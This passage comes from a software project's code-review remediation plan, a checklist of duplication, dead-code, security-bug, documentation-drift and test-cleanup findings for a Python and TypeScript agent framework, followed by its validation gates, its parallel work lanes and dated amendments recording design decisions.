- [ ] **Q027** `bobi/brain/claude.py:328` — _claude_transcript_path re-implements the Claude transcript locator that already exists in bobi/chat_history.py (_claude_projects_dirs +…
- [ ] **Q087** `bobi/build.py:70` — _flatten_if_chained's re-read/setdefault/rewrite of the composed agent.yaml (lines 70-74) is redundant — compose() already sets the agent name to the…
- [ ] **D050/Q007** `bobi/cli.py:95` — The entire local event-server port-resolution trio (_parse_local_event_server_port, _event_server_port_file, _selected_local_event_server_port, ~50…
- [ ] **Q009** `bobi/cli.py:151` — `_ensure_root_bound()` is behaviorally identical to `_detect_project_root()` — its body re-implements the first two lines of the latter and then…
- [ ] **Q046** `bobi/cli.py:925` — Three single-caller pass-through wrappers around bobi.service/bobi.events functions add indirection the file's own house pattern avoids:…
- [ ] **Q126** `bobi/cli.py:1155` — The hidden `ask` command's `--source` option is exercised by nothing in any repo; every documented invocation relies on the 'engineer' default. *(unverified — re-verify first)*
- [ ] **Q047** `bobi/cli.py:1661` — The doctor command's result loop uses `getattr(r, "required", True)` and `hasattr(r, "sandbox_error")` defensiveness against attributes that every…
- [ ] **Q127** `bobi/cli.py:2427` — `monitors add --url` is exercised by nothing in any repo, and Monitor.extra already accepts arbitrary keys (including url) straight from… *(unverified — re-verify first)*
- [ ] **D063** `bobi/cli.py:2897` — The --requested-by JSON parse/validate block is copy-pasted identically in _dispatch_agent and _run_agent_wait.
- [ ] **Q090** `bobi/compose.py:359` — merge_workspace hand-rolls a recursive copy that shutil.copytree(src, dest/'workspace', dirs_exist_ok=True) already provides.
- [ ] **Q089** `bobi/compose.py:507` — The monitor merge threads a redundant monitor_order list through three functions when the insertion-ordered monitor_records dict already carries the…
- [ ] **Q088** `bobi/compose.py:723` — _PRUNE_DIR_SURFACES is an identity-mapping dict whose values are never read and whose 'roles' entry is unreachable.
- [ ] **D088/Q124** `bobi/config.py:336` — The launch-admission default values are hand-maintained in three places — the Config.launch_admission field default_factory,…
- [ ] **Q109** `bobi/config.py:496` — Three accepted spellings reach the one event-server-URL setting — `event_server: <str>`, `event_server: {url: ...}`, and `event_server_url:` — and… *(plausible — re-verify first)*
- [ ] **Q093** `bobi/config.py:615` — The event-server deployment/cursor/bubble state persistence (config.py:601-701) is transport session state, not package configuration, and sits in a…
- [ ] **Q092** `bobi/costs.py:156` — rollup_costs takes a group_by parameter that its body never references.
- [ ] **Q114** `bobi/dep_bootstrap.py:88` — ResolvedRecipe.from_install and ResolvedRecipe.from_agent are the identical one-line function under two names. *(plausible — re-verify first)*
- [ ] **Q091** `bobi/dep_bootstrap.py:419` — pathlib.Path is imported inside four separate functions (and string-quoted in signatures) although a top-level stdlib import has no cycle risk.
- [ ] **Q034** `bobi/env.py:18` — env._configured_brain/pin_brain_from_root re-implement the brain-mapping extraction and defaults that Config._parse and the Config.brain_* properties…
- [ ] **D095** `bobi/events/adapters.py:81` — Running `git remote get-url origin` and normalizing the remote URL to a GitHub owner/repo slug is implemented twice:…
- [ ] **Q019** `bobi/events/adapters.py:118` — adapters.py hand-rolls Slack channel name→ID resolution (_resolve_channel_names + _is_channel_id) that bobi/slack.py's resolve_channel_id already…
- [ ] **D096** `bobi/events/adapters.py:209` — _detect_slack inlines a Slack auth.test call (GET + bearer header + team_id/bot_id extraction) that events/server._slack_auth_info already provides,…
- [ ] **Q108** `bobi/events/client.py:49` — Wall-clock timestamps are written in two conflicting conventions — local-naive time.strftime ISO strings in six modules vs timezone-aware UTC… *(plausible — re-verify first)*
- [ ] **D077/Q105** `bobi/events/drain.py:76` — _without_placeholder_fields is duplicated verbatim in drain.py and channels.py.
- [ ] **Q064** `bobi/events/server.py:236` — ensure_running remaps five unprefixed env vars to BOBI_ES_* with five identical two-line if-blocks.
- [ ] **Q112** `bobi/events/server.py:413` — authorize_resources repeats the same 6-line 'log warning / append unbacked / keep-if-not-filtering / continue' tail four times. *(plausible — re-verify first)*
- [ ] **Q020** `bobi/events/server.py:604` — _slack_auth_info and _slack_app_id are general Slack Web API helpers living in the event-server launcher module, privately imported across module…
- [ ] **Q104** `bobi/history.py:14` — history.py hardcodes Path.home()/'.claude'/'projects' for locating Claude transcripts while chat_history.py's _claude_projects_dirs() is the house… *(plausible — re-verify first)*
- [ ] **Q035** `bobi/http.py:57` — post/get/put/delete each hand-build the same optional-kwargs dict instead of being one-line delegates to the module's own request() helper.
- [ ] **D078** `bobi/ingress.py:55` — The agent.yaml explicit `subscribe:` parsing (yaml load + env interpolation + str-or-list normalization + strip/filter) is implemented twice:…
- [ ] **Q097** `bobi/kb/embedder.py:146` — embedder.stop() hand-parses the pid file (int(read_text().strip()) plus ValueError handling) while is_running() three functions above already uses…
- [ ] **Q096** `bobi/memory.py:181` — cold_memory_kb_name() is a function wrapping the module constant COLD_MEMORY_KB_NAME, with exactly one caller.
- [ ] **Q033** `bobi/memory.py:215` — The cold-memory sync code in memory.py reaches into KBStore internals (store._connect(), _fetchone, _chunk_text) in two places to answer a question…
- [ ] **Q056** `bobi/monitors/scheduler.py:84` — _load_framework_checks hand-rolls importlib (sys.modules check + spec_from_file_location + module_from_spec + exec_module) to load modules that are…
- [ ] **D093/Q058** `bobi/monitors/scheduler.py:149` — _parse_iso (ISO-8601 parse with 'Z'->'+00:00' replacement and naive-to-UTC defaulting) is duplicated verbatim in two modules of the same package.
- [ ] **Q015** `bobi/monitors/scheduler.py:1215` — _on_sleep_cycle_result repeats the same ~10-line failure block seven times: build a detail string, log.warning('… - cursor NOT advanced, retrying…
- [ ] **D094** `bobi/monitors/script_cache_checks.py:564` — _scripts_dir() and the monitor-name sanitizer (replace('/', '_').replace('..', '_')) are duplicated between script_cache_checks.py and tool_checks.py…
- [ ] **Q016** `bobi/monitors/script_cache_checks.py:794` — _slack_notify bypasses the module's own policy-resolution chokepoint: it re-reads and re-parses agent.yaml via _install_policy() and consults…
- [ ] **Q018** `bobi/registry.py:52` — The project_path parameter is threaded through ~15 registry functions but never actually used — the cache and registry list are global.
- [ ] **Q028** `bobi/sdk.py:51` — Claude-CLI path resolution (_resolve_cli_path/get_cli_path/CLAUDE_CLI) lives in the generic session-registry module instead of the claude brain…
- [ ] **Q085** `bobi/sdk.py:121` — Bound-root access is split between two routes: monitors import paths.bound_root directly (aliased as get_project_root) while kb/embedder.py and…
- [ ] **Q084** `bobi/sdk.py:538` — load_resumable_session_id re-reads '<name>.brain' inline instead of calling load_session_brain defined 30 lines above.
- [ ] **Q021** `bobi/setup/actions.py:185` — save_credential's prompt_fn injection is vestigial: every live caller passes a constant-returning lambda, and the only real prompt implementation…
- [ ] **Q006** `bobi/setup/actions.py:353` — The setup web UI's library module imports `_install_pack`, `_write_install_gitignore`, and `_resolve_agent_pack` from `bobi.cli` instead of from…
- [ ] **Q070** `bobi/setup/mcp_registry.py:45` — MCPServerSpec carries a configurable auth-header micro-DSL (auth_header + auth_value with {ref} formatting) and a transport field that no spec in the…
- [ ] **Q071/D123** `bobi/setup/webui/server.py:85` — serialize_state hardcodes the four spec-slot names as a literal tuple instead of using the canonical SPEC_SLOTS constant from bobi.setup.state.
- [ ] **Q069** `bobi/setup/webui/server.py:108` — _probe_event_server hand-rolls an outbound HTTP request with raw urllib.request, against the repo's explicit house rule that framework code uses the…
- [ ] **Q022** `bobi/setup/webui/server.py:543` — The entire MCP connection-test conversational flow (~130 lines: _propose_test, _resolve_pending, _record) lives as nested async generators inside the…
- [ ] **Q023** `bobi/setup/webui/server.py:1284` — Credential resolution precedence is handled in two conflicting styles: the documented house pattern is process-env-first (exported var wins over…
- [ ] **D052** `bobi/slack.py:311` — Slack channel-name-to-ID resolution via paginated conversations.list is implemented twice with already-divergent behavior: slack.resolve_channel_id…
- [ ] **Q010** `bobi/subagent.py:1302` — _start_event_subscription's 5-branch registration decision tree re-implements the authorize→PUT-subscriptions→on-failure-re-register sync sequence…
- [ ] **Q051/D070** `bobi/subagent.py:1738` — run_check_blocking, run_gate_blocking, and run_curator_blocking each repeat the same ~12-line preamble: local `import hashlib`, sha256 slug,…
- [ ] **Q029** `bobi/tool_library.py:44` — The tool_library.py module deliberately shadows the sibling bobi/tool_library/ data directory, a hazard the module spends a docstring paragraph…
- [ ] **D051/Q123** `bobi/webapp/daemon.py:92` — webapp/daemon.py reimplements pid-file helpers (_pid_alive, _read_int) that already exist as bobi.sdk.pid_alive / bobi.sdk.read_pid, and the copies…
- [ ] **D097/Q024** `bobi/webapp/daemon.py:203` — daemon.py re-implements three launch fragments that webui_common/launcher.py already owns: the socket-bind + uvicorn serve pattern, the…
- [ ] **Q075** `bobi/webapp/server.py:158` — Success-only GET handlers inconsistently wrap runtime dicts in JSONResponse (agent_spend, agent_health, agent_sessions, agent_status, subagents,…
- [ ] **Q107** `bobi/webapp/server.py:246` — The setup_open handler's on_finish closure embeds ~30 lines of slot-rename filesystem business logic (shutil.move of agent dirs, nested run/ salvage,… *(plausible — re-verify first)*
- [ ] **Q072** `bobi/webui_common/launcher.py:37` — serve_local's `announce` callback parameter (and the Announcer type alias) has exactly one caller, whose lambda reproduces the default label-based…
- [ ] **Q060** `bobi/workflow/orchestrator.py:108` — _find_project_root(cwd) takes and ignores a cwd parameter, and both call sites pass a meaningful-looking cwd that has no effect.
- [ ] **Q063** `bobi/workflow/orchestrator.py:128` — _setup_worktree re-imports subprocess locally as sp even though the module already imports subprocess at top level and uses it directly elsewhere in…
- [ ] **Q061** `bobi/workflow/orchestrator.py:435` — _make_session's if/else on agent_name executes the identical call in both branches.

**Validation gate**

- [ ] `pytest tests/ -q` (full suite) green
- [ ] Spot e2e (stub brain, isolated `BOBI_HOME`): agent boots, one event round-trips — proves the moved plumbing still wires up

### Phase 7 — event-server TS + web UI (bugs, security, duplication)

Read `docs/FRONTEND_QA.md` before touching the static UIs. Security items first: D007 (attr injection via markdown links — `esc()` must escape quotes), D077 per Q5, D006 (path confinement), D082 (register payload validation).

- [ ] **D098** `bobi/setup/webui/static/app.css:8` — The framed app-window chrome (.app rule, body radial-gradient background, and the data-retro grid overlay) is copied verbatim between the setup UI…
- [ ] **D099** `bobi/setup/webui/static/app.js:20` — HTML-escaping is hand-rolled in three variants across the two UIs: setup app.js esc (5 chars incl. quotes), agent.js esc (3 chars, pre-markdown), and…
- [ ] **D124** `bobi/setup/webui/static/app.js:90` — The token-header JSON fetch wrapper with server-gone health tracking is implemented independently in both SPAs: setup app.js getJSON/postJSON +… *(plausible — re-verify first)*
- [ ] **Q073** `bobi/webapp/static/shell.js:166` — The dynamic `import("./views/agent.js").catch(() => null)` with the stub() fallback ('The agent view is coming in this build.') is leftover…
- [ ] **Q076** `bobi/webapp/static/views/agent.js:17` — The header interpolates the agent name into an innerHTML template with a hand-rolled `name.replace(/[&<>]/g, "")` strip — the single deviation from…
- [ ] **D008/Q025** `bobi/webapp/static/views/agent.js:189` — Markdown link renderer interpolates the URL into a double-quoted href attribute without escaping quotes, allowing agent output to inject…
- [ ] **Q074** `bobi/webapp/static/views/agent.js:322` — loadMessages wraps `await api(...)` in try/catch, but api() is designed never to reject — its own catch returns {ok:false,status:0,data:null} — so…
- [ ] **D011** `event-server/core/src/adapters/chat-sdk-slack.ts:82` — The blanket `if (innerEvent.subtype) skip` drops every Slack message carrying subtype 'file_share', so file uploads in DMs and thread replies are…
- [ ] **D091** `event-server/core/src/adapters/discord.ts:91` — The attachment-to-files normalization loop (build Array<Record<string,string>> with per-key presence checks and String() coercion, then mirror into…
- [ ] **Q117** `event-server/core/src/adapters/github.ts:42` — Webhook-payload field extraction is handled in two conflicting styles: linear/whatsapp/discord narrow at runtime (asRecord/stringField helpers,… *(plausible — re-verify first)*
- [ ] **D047** `event-server/core/src/circuit-breaker.ts:237` — The tripped-breaker pause buffer is unbounded and only flushed lazily on the next event in the same conversation key, so a hot external loop grows…
- [ ] **Q098** `event-server/core/src/circuit-breaker.ts:286` — isBreakerTripped has zero callers anywhere in the repo, including tests.
- [ ] **Q101** `event-server/core/src/core.ts:27` — SlackNormalizationResult.skip is redundant state — it is always exactly `event === null`, and consumers already double-check both.
- [ ] **Q100** `event-server/core/src/core.ts:980` — createIngestEvent hardcodes its topic spelling as [topic, `ingest/${topic}`] instead of calling sourceQualifiedTopics, even though that helper's own…
- [ ] **D089** `event-server/core/src/core.ts:1314` — handleRegisterDeployment trusts `body.subscriptions as string[]` with no shape validation on the unauthenticated MINT path: a string value passes the…
- [ ] **D046** `event-server/core/src/core.ts:2211` — In handleChannelsSend, a file reply resolving a placeholder (edit_ref + mode update/final) on a channel without edit support silently discards the…
- [ ] **Q099** `event-server/core/src/core.ts:2381` — handleSlackWorkspaceRegister hand-rolls three raw fetch() calls to the Slack Web API (auth.test twice, bots.info once) that the already-imported Chat…
- [ ] **D048** `event-server/core/src/core.ts:2445` — handleSlackWorkspaceRegister's global workspace record update is a non-atomic read-merge-write (getSlackWorkspace then putSlackWorkspace of…
- [ ] **Q116** `event-server/core/src/gateway/discord.ts:203` — DiscordGatewaySession.onTimer takes a parameter typed as the literal "heartbeat" and guards against other values — generality for timer kinds that… *(plausible — re-verify first)*
- [ ] **D090** `event-server/src/local.ts:293` — storage.deliver() contains three near-identical copies of the seq-assign / eventBuffer-push / trim / JSON-serialize / broadcast-to-websockets block…
- [ ] **D049** `event-server/src/local.ts:402` — readBody buffers the entire request body into memory with no size cap, so the ingest route's 256KB limit (and every other route) is enforced only…
- [ ] **Q115** `event-server/src/local.ts:838` — evictStaleDeployments re-implements subscription-index and deployment removal that the same file's storage.removeSubscription and… *(plausible — re-verify first)*

**Validation gate**

- [ ] `cd event-server && npm test` (vitest) green, incl. new failing-first tests: `file_share` subtype delivered, breaker pause-buffer bound, `readBody` size cap, workspace-register shape validation
- [ ] New JS escaping tests (or minimal harness per FRONTEND_QA.md): quotes escaped in href interpolation; agent-name rendering
- [ ] `pytest tests/ --ignore=tests/integration --ignore=tests/e2e --timeout=30 -q -k "webapp or webui"`

### Phase 8 — Documentation drift sweep

For each item: re-verify the claim against the tree, then edit the doc to say the truth (or delete the stale artifact — the three shipped-issue spec files and superseded design docs get deleted, matching the plans/ convention). No runtime code changes in this phase.

- [ ] **D113** `CLAUDE.md:70` — '(see Bug fixes above)' references a 'Bug fixes' section that does not exist anywhere in the file (nor in the identical root AGENTS.md).
- [ ] **D106** `README.md:295` — The 'Under the hood' command block shows `bobi agent <name> subagents launch --role <role> --task "context"` without the -w/--workflow option, which…
- [ ] **D121** `agents/eng-team/README.md:20` — README's package layout listing omits shipped files: workflows/stall-recovery.yaml and tools/image-gen.md.
- [ ] **D120** `agents/eng-team/roles/engineer/ROLE.md:148` — The reusable base eng-team engineer prompt embeds bobi-agent-specific test-setup instructions ("For this repo, broad non-integration tests use `pip…
- [ ] **D122** `agents/personal-assistant/agent.md:87` — Setup docs say install prompts for `SLACK_BOT_TOKEN` and `VENN_API_KEY`, omitting `SLACK_SIGNING_SECRET` which agent.yaml also declares as a required…
- [ ] **D082** `bobi/sdk.py:5` — sdk.py module docstring claims every session 'wraps a ClaudeSDKClient', contradicting the post-#485 brain-agnostic session model.
- [ ] **D079** `bobi/slack_manifest.py:23` — Module comment points at event-server/src/index.ts for the Slack webhook route, but that file does not exist.
- [ ] **D110** `docs/BUILDING_AGENT_TEAMS.md:149` — The native-service list ('github', 'slack', 'linear') omits whatsapp and discord, which are fully registered native ingestion adapters.
- [ ] **D111** `docs/BUILDING_AGENT_TEAMS.md:246` — The weekly-job worked example claims eng-team ships context/prep-doc.md 'wired from the director role's monitor/prep.weekly_due handler', but no such…
- [ ] **D112** `docs/BUILDING_AGENT_TEAMS.md:271` — The raw-API tool-guide exception cites 'agents/eng-team/tools/linear.md', which does not exist — the Linear guide moved to context/.
- [ ] **D057** `docs/BUILDING_AGENT_TEAMS.md:298` — The entire 'Decision log (memory)' section documents the retired per-session INDEX.md decision log and an agent-curated memory contract that the…
- [ ] **D108** `docs/EVENT_SERVER.md:472` — Public-server prerequisites say to "set all three provider webhook secrets (WEBHOOK_SECRET, SLACK_SIGNING_SECRET, LINEAR_WEBHOOK_SECRET) so every…
- [ ] **D054** `docs/EVENT_SERVER.md:485` — EVENT_SERVER.md documents the Cloudflare Worker runtime files (event-server/src/index.ts, event-server/src/deployment-session.ts, wrangler.jsonc) as…
- [ ] **D055** `docs/MONITORS.md:61` — Doc says monitor configuration 'merges in tiers, later wins by name' with agent.yaml's monitors: key (tier 3) overriding run/package/monitors.yaml…
- [ ] **D014** `docs/MONITORS.md:68` — Doc says 'Set enabled: false on a name to switch off a default', but a runtime-tier disable (run/package/monitors.yaml or the monitors: key in…
- [ ] **D013** `docs/MONITORS.md:297` — Doc claims a self-healed script that widens its capability envelope 're-enters review even in auto mode' so self-healing 'cannot silently widen what…
- [ ] **D107** `docs/OVERVIEW.md:46` — OVERVIEW states every tool dependency is "declared in the team's agent.yaml under tool_library:", but the eng-team example it uses declares its only…
- [ ] **D053** `docs/QUICKSTART.md:123` — Quickstart Step 3a claims the setup client defaults the team library to ~/bobi-agents/, but the actual default is $BOBI_HOME/agents…
- [ ] **D109** `docs/RELEASE_RUNBOOK.md:107` — The repo-split edit truncated the GHCR package-visibility instruction, leaving an incoherent orphaned sentence fragment and losing the actual…
- [ ] **D030** `docs/WORKFLOW_ENGINE.md:97` — Doc claims a step's `timeout` is 'the declared deadline carried into the registry for the reconciler's dead-man check', but StepDef.timeout is parsed…
- [ ] **D056** `docs/WORKFLOW_ENGINE.md:152` — Doc claims that when a step changes agent: the engine falls back to a fresh session because 'a new agent never inherits another agent's transcript',…
- [ ] **D072** `docs/WORKFLOW_ENGINE.md:198` — Doc says notification failures are always non-fatal and the workflow continues, but the engine deliberately fails the run when an undeliverable…
- [ ] **D006** `docs/WORKFLOW_ENGINE.md:302` — Doc claims the manager calls try_resume_for_event when an event arrives, but nothing in the repo calls it — suspended workflows only resume via the…
- [ ] **D116** `docs/specs/747-sleep-cycle-memory-cap.md:5` — Completed pre-implementation spec for shipped issue #747 lingers in docs/, with a Problem section describing pre-fix behavior as current reality,…
- [ ] **D117** `docs/specs/751-install-write-guard.md:21` — Completed pre-implementation spec for shipped issue #751 lingers in docs/, describing the runtime write guard as nonexistent when it has been shipped…
- [ ] **D118** `docs/specs/issue-753-subagents-wait-max-turns.md:5` — Completed pre-implementation spec for shipped issue #753 lingers in docs/, describing the old broken --wait/check-harness behavior in the present…
- [ ] **D114** `skills/discord-setup.md:100` — Doc claims `bobi agent <name> event-server status` shows a `discord_gateway` block with connection state, but the CLI command prints only Mode and…
- [ ] **D059** `skills/linear-setup.md:76` — Section 5 ('Label issues for automation') and two troubleshooting rows describe a built-in Linear dispatcher (trigger_labels, 'Dispatch only picks up…
- [ ] **D115** `skills/slack-setup.md:56` — The scope list presented as the complete set the manifest pins ('The manifest pins exactly the scopes...' + table + 'Plus chat:write,…
- [ ] **D058** `skills/slack-setup.md:152` — The 'Multiple workspaces' section instructs storing per-workspace Slack tokens in ~/.config/bobi/credentials.yaml, a credential store no code reads…

**Validation gate**

- [ ] Every edited claim re-checked against the tree by the builder (the appendix's "contradicting code" pointer is the check)
- [ ] `pytest tests/ --ignore=tests/integration --ignore=tests/e2e --timeout=30 -q` (docs-only phase must not break collection)

### Phase 9 — Test-suite cleanup

- [ ] **D101** `tests/integration/COVERAGE.md:13` — COVERAGE.md's marker column claims the subagent-launch and e2e-event-flow tests are claude-gated, but both files now run dual-brain with an unmarked…
- [ ] **Q044** `tests/integration/test_context_rotation.py:1` — test_context_rotation.py lives in tests/integration/ but is a fully-mocked unit test (MagicMock SDK clients, no subprocess, no event server, no…
- [ ] **D103** `tests/integration/test_event_server.py:42` — An identical _free_port() helper is defined in seven separate integration test files instead of once in tests/integration/conftest.py.
- [ ] **D100** `tests/integration/test_event_server.py:877` — _send_and_drain ignores the ready.wait() result and its WS thread swallows every exception, so negative-delivery tests pass vacuously when the…
- [ ] **Q128** `tests/integration/test_gateway_openai_brain.py:244` — test_gateway_openai_brain.py defines its own async _drain(session) that duplicates tests/integration/conftest._drain — the helper whose docstring… *(unverified — re-verify first)*
- [ ] **Q041** `tests/integration/test_inbox_transport.py:53` — Four integration files hand-roll /health polling loops (raw urllib + json + status=='ok') that bobi.events.server.health() already implements — and…
- [ ] **D012** `tests/integration/test_manager_lifecycle.py:218` — The only two checks in the whole suite that the manager's drain loop actually starts convert boot failure into pytest.skip, so a drain-loop…
- [ ] **Q043** `tests/integration/test_pr_feedback_followup_dispatch.py:22` — The run-drain_loop-for-one-batch harness (_OneShotQueue + _CaptureInbox + register/unregister_local_inbox + patch time.sleep + swallow…
- [ ] **D105** `tests/test_kb_embedder.py:27` — The mock_project_root fixture is dead code — defined but never requested by any test.
- [ ] **D102** `tests/test_orchestrator.py:399` — The fake Claude-SDK message dataclasses (FakeResultMessage/FakeTextBlock/FakeAssistantMessage) are copy-pasted across four unit-test files, two of…
- [ ] **Q110** `tests/test_orchestrator.py:567` — test_orchestrator.py defines the same 4-line inline 'class FakeBrain: def make_session(...): calls.append(kwargs); return FakeBrainClient()' plus its… *(plausible — re-verify first)*
- [ ] **D104** `tests/test_subagent.py:28` — The tmp_cwd fixture is dead code — defined but never requested by any test.
- [ ] **Q042** `tests/test_subagent_blocking.py:67` — The fake brain/SDK message protocol (FakeTextBlock / FakeAssistantMessage / FakeResultMessage / FakeClient) is modeled independently in four unit…

**Validation gate**

- [ ] `pytest tests/ -q` (full suite) green; the de-skipped manager-lifecycle checks proven by forcing a boot failure locally (they must FAIL, then pass on real boot)
- [ ] `pytest tests/ --collect-only -q` count change explained in the PR (deleted dead tests enumerated)

## Proof of work

Decided here: every **bug** (Phases 1–4, 7) gets a failing test first. **Real-Claude e2e leg required for Phase 1** (dead-transport ack/terminal path is brain-path risk per CLAUDE.md's judgment call); all other phases are stub-proven. **Deletions** (Phase 5) are proven by grep gates + the full suite. **Consolidations** (Phase 6) by suite green + the stub e2e round-trip. **Docs** (Phase 8) by claim-by-claim re-verification. Suites that must stay green throughout: the unit run, `tests/integration`, `event-server` vitest. Convergence gate below is the whole-repo proof.

## Lane map

Five lanes per the Q1 decision. Dispatch issues filed by Split (Lane A first — it is the trust-restoring lane and gates the bot's own terminal-signal reliability; C and D run in parallel with A; B and E build in parallel but land after A since they share bobi/ files).

| Lane | Dispatch issue | Phases | One-line scope | Status |
|---|---|---|---|---|
| A | #818 | 1–4 | Behavioral fixes in bobi/ (session honesty, workflow+pack routing, persistence atomicity, bug batch) | open |
| B | #821 | 5–6 | Behavior-preserving cleanup in bobi/ (dead-code purge, consolidations) — lands after A | open |
| C | #819 | 7 | event-server TS + web UI (bugs, security, duplication) — parallel with A | open |
| D | #820 | 8 | Documentation drift sweep — parallel with A | open |
| E | #822 | 9 | Test-suite cleanup — lands after A | open |

**Lanes (filed 2026-07-22):** A=#818, B=#821, C=#819, D=#820, E=#822. A: Phases 1–4. C: Phase 7 (parallel with A, no shared files). D: Phase 8 (docs, parallel). B: Phases 5–6 (builds in parallel, *lands after* A — shares bobi/ files, not a build-blocking dependency). E: Phase 9 (builds in parallel, *lands after* A). Only "lands after" ordering here — nothing build-blocks except that B/E should rebase onto A's merge to avoid churn.

- [ ] Convergence gate: full `pytest tests/ -q` + `cd event-server && npm test` green on main after the last lane merges, plus the in-repo dogfood run (isolated `BOBI_HOME`, dogfood-content-review pack: agent boots, event round-trips, the D015 fix-step route actually takes) — run by the session landing the last lane

## Amendments

*(append-only)*

- **2026-07-22** (Split): filed lanes A–E as #818–822 (thin dispatch pointers). B/E land after A (#818); C/D parallel with A.
- **2026-07-22** (Zach + planning session): Q1–Q5 decided (all recommended option — 5 lanes, plausible/unverified in scope with re-verification, remove `--resume`, delete expired compat now, restrict credential endpoint to declared vars). Status → Approved. Lane map filled (A–E).
- **2026-07-24** (plan-file hygiene): renamed this plan and its findings appendix to date-prefixed filenames — `plans/review-remediation.md` → `plans/2026-07-22-review-remediation.md`, `plans/review-remediation-findings.md` → `plans/2026-07-22-review-remediation-findings.md` (dates = first-commit date; `git mv` preserved history). In-repo cross-references updated; GitHub issue bodies (#817–822) still cite the old paths and are left as historical record (this amendment is the pointer).
- **2026-07-22** (build session, authorized by Zach): **D001+D002 shipped early** (ahead of Lane A dispatch) to unblock headless execute — PR **#825** (`_drain_turn` dead-transport branch sets `_last_is_error`; two behavioral regressions + a two-brain e2e with a new `__stub__:raise` directive and a claude leg that SIGKILLs the live CLI mid-turn). Bot PR **#800** (issue #799) landed the same day and independently fixed the D001 ack-loss via `_drain_turn`'s `None`-return; #825 was rebased on top and carries the D002 phase-honesty half #800 didn't cover. Bot PR #810 (atomic registry state.json publish) landed in the same batch. Lane A's remaining Phase 1–4 items are unchanged.
- **2026-07-25** (Lane A review-fix session): **D009's residual stale-block gap escalated, not patched.** D009 as written - `make_session` clearing the managed block whenever a call site omits `options['mcp_servers']` - IS fixed: an omitted key now means "nothing stated" and the file is left alone. The review gate then flagged the other side of that gate: a codex team that DROPS its `mcp_servers` never passes the key again, so its own stale block is never cleaned up. The obvious repair (absent key -> read the set from the installed team config) was implemented, reviewed, and **reverted** - it is strictly worse than the gap. `$CODEX_HOME` is machine-global (nothing in bobi scopes it per agent; it defaults to `~/.codex`) while the resolved team config is bound-root-local, so on a box with two installed teams the one declaring no servers wipes the other's live block on every `make_session`; and `package/agent.yaml` is written non-atomically (`compose.py`, `install.py`), so a `make_session` in that window reads an empty file as "declares none" and wipes a correct block for a single team too. Both are the exact "strip the servers out from under every live session" failure the guard exists to prevent. Closing it needs per-agent `CODEX_HOME` scoping or an ownership-stamped managed block - a design decision, not a patch. `tests/test_brain_codex.py::test_omitted_mcp_option_is_not_resolved_from_the_installed_team` pins the unsafe shape so it cannot be re-introduced by someone re-deriving the same "obvious" fix.

- **2026-07-25** (Lane A build session): **D027(b) escalated, not improvised.** `try_resume_for_event` still has no production caller, so the workflow await/resume feature is dead end-to-end. Wiring it needs a decision, not a patch, on three points: (1) there is no code-level event-arrival hook at all - trigger matching is prose consumed by the manager's *prompt* (`format_workflow_menu`), so a dispatch site must be chosen (drain / reactor / subscription); (2) `await_event` is compared `==` against a raw event type, so the event-name vocabulary and run_key/repo scoping need defining; (3) `resume_workflow` re-stamps the run record with `os.getpid()`, so resuming in-process would stamp the MANAGER's pid - a reconciler timeout or `subagents cancel` would then SIGTERM the whole manager, and a dead resume thread would never be reaped; correct wiring needs a spawned process plus an explicit timeout. D027(a) (claim before existence check) IS fixed in this lane. The doc no longer misstates this: `docs/WORKFLOW_ENGINE.md` used to claim the manager calls `try_resume_for_event`, and the same PR replaced that claim with a **Not wired today** callout recording that the function has no production caller, that `bobi agent <name> workflows resume <run_id>` is the only live resume path, and that the contract paragraph following it is not a flow that runs today. D006 (Lane D) still owns the rest of that doc's accuracy sweep.

- **2026-07-26** (planning session, authorized by Zach): **Phase 2 mostly superseded** by `plans/2026-07-26-checklist-execution-model.md` (tracking #852, PR #853), which retires the workflow step machine — steps, handoff contracts, route conditions, and await/resume all go. Nine of twelve Phase 2 items fix internals scheduled for deletion and are marked `[f]`-superseded with per-item rationale: D005, D027, D024, D025, D028, Q017/D026, D015, D016, and D060 (the last absorbed rather than superseded — the cutover rewrites every pack's routing surface). Phase 2's validation gate was rewritten to match, since its original lines proved suspend/resume, the condition parser, and handoff re-prompting.
  **Three items survive and stay in scope**, because they are not step-machine code: **D029** (registry entry stuck `running` — now *load-bearing*, since the checklist plan's in-progress monitor resolves ownership from live registry entries, so a stuck entry makes a dead unit look permanently alive and blocks re-dispatch forever), **D017** (`auto_dispatch` event routing — `bobi/workflow/triggers.py` is explicitly kept, and per Notes issue pickup needs a Slack directive until this lands), and **D119** (pack/service declaration consistency).
  **Phase 3 is untouched and explicitly retained as shared infrastructure** the successor plan consumes rather than forks: **D092** (hoist the atomic-write pattern into one `fsutil` helper) and **Q062/D071** (the `claim()` crash window). The checklist plan's Phase 2 depends on D092's helper for its artifact writes, so Phase 3 should land before it.
  If the cutover is abandoned, the `[f]`-superseded items return to scope — this amendment is the pointer, and nothing was deleted from the plan.

- **2026-07-26** (Lane A merge session, decisions by Zach): **the Phase 2 descope met work already done.** The 2026-07-26 supersede amendment above was written on `main` while Lane A's branch had *already fixed* nine of those items, each failing-test-first. Merging `main` in produced a direct marker conflict: `[f]`-superseded against `[x]`-fixed. Resolved in favor of what is true of the code - the markers read `[x]` and each carries the descope context as "superseded going forward", because reverting working, tested fixes to honor a "do not spend effort here" decision would be a second waste, and the surface still exists until Phase 4 of the checklist plan removes it. Two of those fixes are load-bearing *today* rather than merely harmless: the condition parser is what makes `issues_count > 0` route at all and it closes a live crash (a value containing a regex escape raised `re.error` out of `evaluate_condition`), and D029 is what the checklist plan's own in-progress monitor depends on (its Q3 resolves ownership from live registry entries, so an entry stuck `running` blocks re-dispatch forever). D027 stays `[f]`: its escalation is now *answered* - the feature is deleted rather than wired - which is a resolution, not a fix.
- **2026-07-26** (Lane A merge session, decision by Zach): **Q5's allow-list is wider than its literal text, deliberately.** Q5 says restrict `/api/credential/value`'s process-env fallback to "the credential var names declared by the installed pack". The implementation also admits the connector **catalog** (14 compiled-in names: `GITHUB_TOKEN`, `SLACK_*`, `LINEAR_*`, `DISCORD_*`, `WHATSAPP_*`, `VENN_API_KEY`), because the Connect panel renders a Copy affordance on catalog cards and `/api/chat` does not add slack to `spec.services`, so pack-declared-only would silently break the "already satisfied by your environment" case on any fresh setup. Zach chose to keep the catalog rather than tighten. The set stays closed and non-mintable - it is compiled into bobi, `AWS_*`/`ANTHROPIC_*` are refused, and the endpoint remains loopback- plus nonce-guarded. What is deliberately excluded is everything a caller *can* mint in one request: `/api/mcp/add`-recorded var names and `spec.mcp_servers`. That exclusion is the fix for the review's BLOCKING bypass finding, and `test_installing_a_declaring_team_is_the_only_route_in` pins the boundary.
